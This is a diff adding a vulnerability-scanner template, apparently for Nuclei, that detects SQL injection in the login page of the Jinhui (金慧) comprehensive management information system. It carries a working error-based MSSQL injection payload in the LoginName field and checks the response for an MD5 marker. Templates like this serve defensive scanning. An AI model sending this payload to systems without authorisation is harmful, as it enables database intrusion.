@@ -1,0 +1,30 @@
+id: jinhui-loginbegin-sqli
+
+info:
+  name: 金慧-综合管理信息系统 - SQL Injection
+  author: qwtd
+  severity: high
+  reference:
+    - https://mp.weixin.qq.com/s/UW62B3TrUBcqi1wew1TTxg
+  tags: 金慧-综合管理信息系统
+
+variables:
+  num: "{{rand_int(80000, 100000)}}"
+
+http:
+  - raw:
+      - |
+        POST /Portal/LoginBegin.aspx?ReturnUrl=%2f HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Todo=Validate&LoginName=1%27+AND+5094+IN+%28RIGHT%28sys.fn_VarBinToHexStr%28hashbytes%28%27MD5%27%2C%27{{num}}%27%29%29%2C32%29%29+AND+%27JKJg%27=%27JKJg&Password=&CDomain=Local&FromUrl=
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, substr(md5(to_string(num)), 0, 31))
